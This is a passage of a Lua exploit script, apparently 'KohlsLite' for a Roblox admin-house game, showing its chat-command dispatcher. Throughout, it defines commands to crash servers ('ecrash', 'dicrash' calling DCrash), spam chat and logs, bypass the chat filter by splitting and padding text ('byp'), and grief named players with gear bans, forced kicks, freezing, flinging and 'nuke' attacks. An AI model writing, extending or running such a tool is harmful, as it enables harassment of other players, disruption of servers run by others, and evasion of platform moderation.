                local dum = string.sub(msg:lower(), #prefix + 6)
                PLAYERCHECK(dum)        
                if player ~= nil then
                        dummy = player
                        idum = cplr
                        DumbGuy()
                else
                        Remind('Cannot find player with the name: '..dum)
                end

    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'bend' then -- pr
                local bendin = string.sub(msg:lower(), #prefix + 6)
                Chat("rocket/"..bendin);task.wait(.5)
                Chat("freeze "..bendin)
                Chat("unrocket/"..bendin);task.wait(.34)
                Chat("name "..bendin.." "..bendin);task.wait(.34)
                Chat("thaw "..bendin);task.wait(.34)
                Chat("unseizure "..bendin)
                Chat("tp "..bendin.." "..bendin)
                Chat("sit "..bendin)
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'antidisco' then
        antidisco = true
    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unantidisco' then
        antidisco = false
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'antiflash' then
        antiflash = true
    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unantiflash' then
        antiflash = false
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'antifogend' then
        antifogend = true
    end

    if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'unantifogend' then
        antifogend = false
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'antiilight' then
        antiilight = true
    end

    if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'unantiilight' then
        antiilight = false
    end

    if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'antifogstart' then
        antifogstart = true
    end

    if string.sub(msg:lower(), 1, #prefix + 14) == prefix..'unantifogstart' then
        antifogstart = false
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antifogc' then
        antifogcolor = true
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantifogc' then
        antifogcolor = false
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antitime' then
        antitime = true
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantitime' then
        antitime = false
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'antiamb' then
        antiambient = true
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unantiamb' then
        antiambient = false
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antitrip' then
        antitripmine = true
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantitrip' then
        antitripmine = false
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'antibright' then
        antibrightness = true
    end

    if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'unantibright' then
        antibrightness = false
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'antioutamb' then
        antioutamb = true
    end

    if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'unantioutamb' then
        antioutamb = false
    end

    if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'adv' then
       ADVERTISEMENT()
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'cadv' then
       CADVERTISEMENT()
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'ipboom' then
       IPBOOM()
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'logspam' then
       LogSpam()
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'tptool' then
        InitTool()
    end

   if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'supercmd' then
        supermessage = string.sub(msg, #prefix + 10)
        SuperCMD(supermessage)
    end

   if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'supert' then
        amon = tonumber(string.sub(msg:lower(), #prefix + 8))
    end

   if string.sub(msg, 1, #prefix + 5) == prefix..'spamt' then
        spamtext = string.sub(msg, #prefix + 7)
        spam = true
        spamon = true
    end

   if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'unspamt' then
        spam = false
        spamon = false
    end

   if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'chatz' then
        ChatFudge()
   end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'spamw' then
        spamwait = tonumber(string.sub(msg:lower(), #prefix + 7))
    end

   if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'spamwait' then
        spamwait = tonumber(string.sub(msg:lower(), #prefix + 10))
    end

   if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'spamoff' then
        spamon = false
    end

  if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'spamon' then
        spamon = true
    end

  if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'cbtools' then
                local cbt = string.sub(msg:lower(), #prefix + 9)
                if cbt ~= "" then
                                Chat("gear " .. cbt .. " 16200204")
                                Chat("gear " .. cbt .. " 16200402")
                                Chat("gear " .. cbt .. " 16969792")
                                Chat("gear " .. cbt .. " 73089190")
                else
                                Chat("gear me 16200204")                                        
                                Chat("gear me 16200402")
                                Chat("gear me 16969792")                                        
                                Chat("gear me 73089190")
                end
  end

  if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'ecrash' then
            Chat("fix") -- ;Chat(prefix.."perm2")
            musicsay = false
            task.wait(0.5);Chat(prefix.."unantimsg")
            Chat("h \n\n\n see you soon \n\n\n");Chat(prefix.."gmusic89")
            Chat("fogcolor 0 0 0");Chat("time 0");Chat("fogend 0");Chat("paint all black")
            task.wait(0.75)
            DCrash()        
    end

  if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'dicrash' then
	    musicsay = false -- na ts2021 forgot this jit tripping - from ts2021
            Chat(prefix.."gchar all D_ionte");Chat(prefix.."gmusic62");Chat("h \n\n\n all praise dionte \n\n\n");Chat("name all D_ionte is our hero")
	    task.wait(1.5)
	    DCrash()
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'rockmap' then
        StoneMap()
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'stonemap' then
        StoneMap()
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'hammer' then
        SpHammer()
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'icemap' then
		IsOnMobile = table.find({Enum.Platform.IOS, Enum.Platform.Android}, game:GetService("UserInputService"):GetPlatform()) -- infinite yield duh
		if IsOnMobile then
                	Remind("You have been detected as being on mobile. This command will not run to prevent crashing.")
		else
                	Remind("If you crash... that sucks!")
               		IceMap()
	        end
    end

    if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'byp' then -- created by tech-187, open source on his repo :)
        local args = string.split(msg, " ")
        local cmd = args[1]
            local bypsed = table.concat(args, " ", 2)
        local file = bypsed
        local a = {}

        for letter in file:gmatch(".") do
                  if letter ~= "\r" and letter ~= "\n" then
                            table.insert(a, letter)
                  end
        end

        for b, c in ipairs(a) do
                    local d = "variable_" .. tostring(b)
                   _G[d] = c
        end

        for b, c in ipairs(a) do -- it works but i still don't care if it sometimes doesn't bypass!
                    local e = string.rep("  ", 2 * (b - 1))
                if haspersons == true then
                        Chat("h/KohlsLite ez\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n" .. e .. _G["variable_" .. tostring(b)])
                else
                            Chat("h KohlsLite ez\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n" .. e .. _G["variable_" .. tostring(b)])
                end
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'sregen' then
        SRegen = true
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'unsregen' then
        SRegen = false
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'autogpc' then
        autogpcheck = true
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unautogpc' then
        autogpcheck = false
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'padban' then
         local dasplayer = string.sub(msg:lower(), #prefix + 8)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                Chat("h \n\n\n [KohlsLite]: "..player.." has been padbanned. \n\n\n")
                table.insert(padbanned, player)
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
    end

    if string.sub(msg, 1, #prefix + 8) == prefix..'unpadban' then
         local dasplayer = string.sub(msg:lower(), #prefix + 10)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                Chat("h \n\n\n [KohlsLite]: "..player.." has been unpadbanned! \n\n\n")
                table.remove(padbanned, table.find(padbanned, player))
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
    end

    if string.sub(msg, 1, #prefix + 8) == prefix..'padreinf' then
       Chat("h \n\n\n [KohlsLite]: Pad reinforcements are on. \n\n\n")
       padreinforcements = true
    end

    if string.sub(msg, 1, #prefix + 10) == prefix..'unpadreinf' then
       Chat("h \n\n\n [KohlsLite]: Pad reinforcements are off! \n\n\n")
       padreinforcements = false
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'qattach' then
        Chat("sit me down");task.wait(1)
        Chat("punish me");task.wait(1)
        Chat("unpunish me")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'biglogs' then
            game.Players.LocalPlayer.PlayerGui:FindFirstChild("ScrollGui").TextButton.Frame.Size = UDim2.new(0,1000,0,1000)
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'regen' then
        Regen()
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'house' then
        House()
    end

    if string.sub(msg:lower(), 1, 3)  == '-re' then
        Chat("reset me")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'hhouse' then
       if haspersons then Chat("invis/me") else Chat("invis me") end
       House()
       task.wait(.35)
       if haspersons then Chat("vis/me") else Chat("vis me") end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'phelp' then
        local pos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
        phelper = string.sub(msg:lower(), #prefix + 7)
        House()
        task.wait(0.5)
        if phelper ~= "" then        
                Chat("tp "..phelper.." me")
        else
                Chat("tp all me")
        end
	if phelper ~= "all" and phelper ~= "" then
		task.wait(0.5)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
	end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'spawn' then
        GSpawn()
    end

    if string.sub(msg, 1, #prefix + 7) == prefix..'execute' then
        Execute(string.sub(msg, #prefix + 9))
    end

    if string.sub(msg, 1, #prefix + 8) == prefix..'announce' then
        annsecret = string.sub(msg, #prefix + 10)
        Announce()
    end

    if string.sub(msg, 1, #prefix + 9) == prefix..'cannounce' then -- inspired by scv3-var
        local args = string.split(msg, " ")
        local dasplayer = args[2]
        PLAYERCHECK(dasplayer)
        if player ~= nil then
                        sus = player
                        whatsapp = table.concat(args, " ", 3)
                        AnnounceWM()
        else
                               Remind('Cannot find player with the name: '..dasplayer)
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'prefix' then
        prefix = string.sub(msg:lower(), #prefix + 8)
    end

    if string.sub(msg:lower(), 1, 7) == 'cprefix' then
        Remind("Your current prefix is "..prefix)
    end

   if string.sub(msg:lower(), 1, #prefix + 4) == prefix.."pmap" then
		local colourhere = string.sub(msg, #prefix + 6)
		PaintMap(colourhere,"norm")
   end

   if string.sub(msg:lower(), 1, #prefix + 8) == prefix.."paintmap" then
		local colourhere = string.sub(msg, #prefix + 10)
		PaintMap(colourhere,"norm")
   end

  if string.sub(msg:lower(), 1, #prefix + 9) == prefix.."messpaint" then
		PaintMap(colourhere,"random")
   end

   if string.sub(msg:lower(), 1, #prefix + 6) == prefix.."rbgmap" then
		local args = string.split(msg, " ")
		r = args[2] 
		g = args[3]
		b = args[4]
		PaintMap_2(r,g,b)
   end
		
 if string.sub(msg:lower(), 1, #prefix + 4) == prefix.."rmap" then
		if Loops.rainbowmap == false then
			Loops.rainbowmap = true
			rmap()
		else
			Remind("Already enabled!")
		end
   end

 if string.sub(msg:lower(), 1, #prefix + 5) == prefix.."rbase" then
		if Loops.rbase == false then
			Loops.rbase = true
			rbase()
		else
			Remind("Already enabled!")
		end
   end

 if string.sub(msg:lower(), 1, #prefix + 4) == prefix.."rfog" then
		deran = tonumber(string.sub(msg:lower(), #prefix + 6))
		if Loops.rfog == false then
			Loops.rfog = true
			rfog(deran)
		else
			Remind("Already enabled!")
		end
   end

   if string.sub(msg:lower(), 1, #prefix + 6) == prefix.."unrmap" then
		Loops.rainbowmap = false
		task.wait(1);FixPaint()
   end

   if string.sub(msg:lower(), 1, #prefix + 7) == prefix.."unrbase" then
		Loops.rbase = false
		task.wait(1);FixPaint()
   end

   if string.sub(msg:lower(), 1, #prefix + 6) == prefix.."unrfog" then
		Loops.rfog = false
   end

   if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'autoafk' then
        autoafk = true
   end

   if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unautoafk' then
        autoafk = false
   end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'alladmin' then
       alladmin = true
       Chat("h \n\n\n [KohlsLite]: Everyone has been given admin! Chat any command. \n\n\n")
    end

    if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'nok' then
                NOK()
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'2nok' then
                NOK2()
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'tnok' then
                TNOK("true")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'untnok' then
                TNOK("false")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'getping' then
                GetPing()
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'autogb' then
                 autogb = true
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'unautogb' then
                 autogb = false
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'qpunish' then -- idea from zercon
                	local trolled = string.sub(msg:lower(), #prefix + 9)
                        Chat("punish " .. trolled)
                        Regen()
    end   

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'spunish' then -- 
                	local trolled = string.sub(msg:lower(), #prefix + 9)
                        Chat("speed "..trolled.." inf")
    end   

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'gpunish' then -- 
                	local trolled = string.sub(msg:lower(), #prefix + 9)
                        Chat("setgrav "..trolled.." -9e9")
    end   

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'ungearban' then
                local plrg = string.sub(msg:lower(), #prefix + 11)
                if plrg == "" or plrg == "me" then
                         game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
                else 
                        Ungearban(plrg)
                end
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'gearban' then
                 local dasplayer = string.sub(msg:lower(), #prefix + 9)
                 PLAYERCHECK(dasplayer)
                 if player ~= nil then
                        xplayer = player
                        xplr = cplr
                        Gearban()
                 else
                               Remind('Cannot find player with the name: '..dasplayer)
                 end
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'rail' then
                 local dasplayer = string.sub(msg:lower(), #prefix + 6)
                 PLAYERCHECK(dasplayer)
                 if player ~= nil then
                        railer = player
                        Rail()
                 else
                               Remind('Cannot find player with the name: '..dasplayer)
                 end
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'lemonman' then
                 local dasplayer = string.sub(msg:lower(), #prefix + 10)
                 PLAYERCHECK(dasplayer)
                 if player ~= nil then
                        lemonman = player
                        lman = cplr
                        Lemon()
                 else
                               Remind('Cannot find player with the name: '..dasplayer)
                 end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'laser' then
                 local dasplayer = string.sub(msg:lower(), #prefix + 7)
                 PLAYERCHECK(dasplayer)
                 if player ~= nil then
                        laserman = player
                        laman = cplr
                        Laser()
                 else
                               Remind('Cannot find player with the name: '..dasplayer)
                 end
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'surround' then
                 local dasplayer = string.sub(msg:lower(), #prefix + 10)
                 PLAYERCHECK(dasplayer)
                 if player ~= nil then
                        surrer = player
                        Surround("sur")
                 else
                               Remind('Cannot find player with the name: '..dasplayer)
                 end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'rnuke' then
                range = tonumber(string.sub(msg:lower(), #prefix + 7))
		RNuke(range)
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'jnuke' then
		JNUKE()
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'weld' then
                local args = string.split(msg, " ")
        	if #args >= 3 then
            		local target = args[2]
                 	PLAYERCHECK(target)
                 	if target ~= nil then
                        	welder = player
				wld = cplr
				mode = table.concat(args, " ", 3)
                        	Welding(mode)
                 	else
                               Remind('Cannot find player with the name: '..dasplayer)
                	 end
		end
    end


    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'hfreeze' then
                local args = string.split(msg, " ")
        	if #args == 2 then
            		local target = args[2]
                 	PLAYERCHECK(target)
                 	if target ~= nil then
                        	welder = player
				wld = cplr
                        	HFreeze()
                 	else
                               Remind('Cannot find player with the name: '..dasplayer)
                	 end
		end
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'tattach' then
                local args = string.split(msg, " ")
        	if #args == 2 then
            		local target = args[2]
                 	PLAYERCHECK(target)
                 	if target ~= nil then
                        	welder = player
				wld = cplr
                        	TAttach()
                 	else
                               Remind('Cannot find player with the name: '..dasplayer)
                	 end
		end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'clone' then
                 local getnumber = string.sub(msg:lower(), #prefix + 7)
                 Clone(getnumber)
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'table' then
                 local getnumber = string.sub(msg:lower(), #prefix + 7)
                 Table(getnumber)
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'potion' then
                 local getnumber = string.sub(msg:lower(), #prefix + 8)
                 Potion(getnumber)
    end

   if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'tripmine' then
                 local getnumber = string.sub(msg:lower(), #prefix + 10)
                 MineTrip(getnumber)
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'cannon' then
                 local getnumber = string.sub(msg:lower(), #prefix + 8)
                 Cannon(getnumber)
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'zombie' then
                 local getnumber = string.sub(msg:lower(), #prefix + 8)
                 Zombie(getnumber)
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'alpaca' then
                 local getnumber = string.sub(msg:lower(), #prefix + 8)
                 Alpaca(getnumber)
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'piano' then
                 local getnumber = string.sub(msg:lower(), #prefix + 7)
                 Piano(getnumber)
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'bdrop' then
                 local getnumber = string.sub(msg:lower(), #prefix + 7)
                 Bassdrop(getnumber)
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'cstory' then
                 local getnumber = string.sub(msg:lower(), #prefix + 8)
                 Coolstory(getnumber)
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'banana' then
                 local getnumber = string.sub(msg:lower(), #prefix + 8)
                 Banana(getnumber)
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'nuke' then
                 local dasplayer = string.sub(msg:lower(), #prefix + 6)
                 PLAYERCHECK(dasplayer)
                 if player ~= nil then
                        surrer = player
                        Surround("nuke")
                 else
                               Remind('Cannot find player with the name: '..dasplayer)
                 end
    end

    if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'age' then
                 local dasplayer = string.sub(msg:lower(), #prefix + 5)
                 PLAYERCHECK(dasplayer)
                 if player ~= nil then
                        myageis = cplr.AccountAge
                        print(myageis)
                        Speak(player.."'s age is "..myageis.." days!")
                        Chat("h \n\n\n [KohlsLite]: "..player.."'s account age is "..myageis.." days! \n\n\n")
                 else
                               Remind('Cannot find player with the name: '..dasplayer)
                 end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'dkick' then -- buggy!
                 local dasplayer = string.sub(msg:lower(), #prefix + 7)
		 PLAYERCHECK(dasplayer)
                 if player ~= nil then
			dk = cplr
			dkicked = player
			dkickin = true
                        dkick(dk, dkicked)
                 else
                        Remind('Cannot find player with the name: '..dasplayer)
                 end
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'undkick' then -- buggy!
                 local dasplayer = string.sub(msg:lower(), #prefix + 9)
		 PLAYERCHECK(dasplayer)
                 if player ~= nil then
			dkickin = false
			Chat("respawn "..dkicked)
                 else
                        Remind('Cannot find player with the name: '..dasplayer)
                 end
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'rpaintui' then
                for i,v in ipairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
                                if v.Name == "SelectionBox" or v.Name == "LineHandleAdornment" or v.Name == "PaletteGui" then
                                                        v:Destroy()
                                end
                end
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'sspawn' then -- save spawn
                SSpawn()
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'pspawn' then -- print current spawn
                PSpawn()
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'gsspawn' then -- go to saved spawn
                Spawn()
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'frespawn' then -- force respawn (broken)
        FRespawn()
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'mrespawn' then -- force respawn (broken)
        MRespawn()
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'dummy' then
                 Dummy()
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'ffix' then 
        GravFix()
        Chat("respawn me")
        ColFix()
        movestatus = false
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'rejoin' then
        Remind("Rejoinning... please wait!")
        REJOIN()
    end

    if string.sub(msg:lower(), 1, #prefix + 2) == prefix..'rj' then
        Remind("Rejoinning... please wait!")
        REJOIN()
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'shop' then
        Remind("Serverhopping... please wait!")
        Remind("[WARN]: THIS MAY REJOIN YOU TO THE SAME SERVER.")
        SERVERHOP()
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'serverhop' then
        Remind("Serverhopping... please wait!")
        Remind("[WARN]: THIS MAY REJOIN YOU TO THE SAME SERVER.")
        SERVERHOP()
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'infjump' then
                INFJUMP = true
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'uninfjump' then
                INFJUMP = false
    end

    if string.sub(msg:lower(), 1, #prefix + 2) == prefix..'sp' then
         game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = tonumber(string.sub(msg:lower(), #prefix + 4))
    end

    if string.sub(msg:lower(), 1, #prefix + 2) == prefix..'jp' then
         game.Players.LocalPlayer.Character.Humanoid.JumpPower = tonumber(string.sub(msg:lower(), #prefix + 4))
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'hlth' then
         game.Players.LocalPlayer.Character.Humanoid.Health = tonumber(string.sub(msg:lower(), #prefix + 6))
    end

    if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'fov' then
        workspace.Camera.FieldOfView = tonumber(string.sub(msg:lower(), #prefix + 5))
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'noclip' then
         WalkThru("on")
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'clip' then
         WalkThru("off")
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'ufly' then
         eincrash = true ; task.wait(0.1) ; UFLY()
    end
		
    if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'isc' then
        local Ping1 = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
        task.wait(1)
        local Ping2 = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()   
        if Ping1 == Ping2 then 
                Remind("The server's crashed!") 
        else 
                Remind("This server's not crashed!")
        end
    end

   if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'checkc' then
        local dasplayer = string.sub(msg:lower(), #prefix + 8)
        PLAYERCHECK(dasplayer)
        if player ~= nil then
                        clientcheck = player
                        Chat("unpunish " .. clientcheck)
                        Chat("unfly " .. clientcheck)
                        Chat("thaw " .. clientcheck)
                        Chat("clip " .. clientcheck)
                        Chat("unsit " .. clientcheck)
                         local Animator = workspace:FindFirstChild(clientcheck):WaitForChild("Humanoid"):WaitForChild("Animator")
                            if #Animator:GetPlayingAnimationTracks() == 0 then
                                        Remind(clientcheck .. "'s client is frozen.")
                            else
                                Remind(clientcheck .. "'s client is running fine.")
                            end

         else
                               Remind('Cannot find player with the name: '..dasplayer)
         end
    end

   if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'breakanims' then
        local dasplayer = string.sub(msg:lower(), #prefix + 12)
        PLAYERCHECK(dasplayer)
        if player ~= nil then
                        bokck = player
                            Chat('reset ' .. bokck)
                                task.wait()
                                Chat('name ' .. bokck .. ' Torso')
                                task.wait()
                                Chat("unname " .. bokck)
         else
                               Remind('Cannot find player with the name: '..dasplayer)
         end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'nocam' then
                NoCam()
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'wbcam' then
                TogCam()    
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'wfcam' then
                TogCam()    
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'breakcam' then
                NoCam()
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'fixcam' then
                FixCam()
    end

     if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'fixvelo' then
                VFix()
     end

     if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'obpfixv' then
                Remind("You need to be positioned by a wall!")
                Chat("sit me down");task.wait(1)
                Chat("punish me");task.wait(1)
                Chat("unpunish me");task.wait(1)
                Chat("unskydive me")     
     end

   if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'bpfixv' then
	local target = workspace.Terrain["_Game"].Workspace.Baseplate
	movepart(target)  
	repeat task.wait() until mready == true ; task.wait(0.33)
	Chat("skydive me");task.wait(0.33);Chat("unskydive me");task.wait(0.33);Chat("respawn me")
     end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'flipbp' then
	Remind("Flipping...")
	local target = workspace.Terrain["_Game"].Workspace.Baseplate
	movepart(target)  
	repeat task.wait() until mready == true ; task.wait(0.33)
	Chat("skydive me");task.wait(0.33);Chat("unskydive me");task.wait(0.33);Chat("trip me");task.wait(0.33);Chat("respawn me")
     end

     if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'fakebp' then
                local gamefolder = game:GetService("Workspace").Terrain["_Game"]
                if not gamefolder:FindFirstChild("PhantomStorage") then
                            local PStore = Instance.new("Folder")
                            PStore.Name = "PhantomStorage"
                            PStore.Parent = gamefolder
                end
                local Storage = gamefolder["PhantomStorage"] -- PhantomStorage folder
                local Phantom_Baseplate = Instance.new("Part")
                Phantom_Baseplate.BrickColor = BrickColor.new("Bright green")
                Phantom_Baseplate.Material = Enum.Material.Plastic
                Phantom_Baseplate.Position = Vector3. new(0, 0.1, 0)
                Phantom_Baseplate.Size = Vector3. new(1000, 1.2, 1000)
                Phantom_Baseplate.Anchored = true
                Phantom_Baseplate.Parent = Storage
    end

     if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'nofakebp' then
                game:GetService("Workspace").Terrain["_Game"]["PhantomStorage"]:Destroy()
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'fixcol' then
                ColFix()
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'fixgrav' then
                GravFix()
    end

     if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'novelo' then
                NoVelo()
     end

     if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'breakvelo' then
                NoVelo()
     end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unalladmin' then
       alladmin = false
        Chat("h \n\n\n [KohlsLite]: Free admin is off. \n\n\n")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'loopgrab' then
        loopgrab = true
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unloopgrab' then
        loopgrab = false
    end

     if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'fastpads' then
                FastPads()
     end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'2loopgrab' then
        loopgrab2 = true
    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'2unloopgrab' then
        loopgrab2 = false
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'perm' then
        perm = true
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'perm2' then
        perm2 = true
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'unperm' then
        perm = false
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'unperm2' then
        perm2 = false
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'allpads' then
                AllPads()
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'checkbp' then
        local checker = string.sub(msg:lower(), #prefix + 9)
        PLAYERCHECK(checker)
        if player ~= nil then 
                CheckBackpack()
        else
                Remind('Cannot find player with the name: '..checker)
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'noadsky' then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,1000,0)
    end
    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'ungearme' then
                Chat("ungear me																					all")
    end

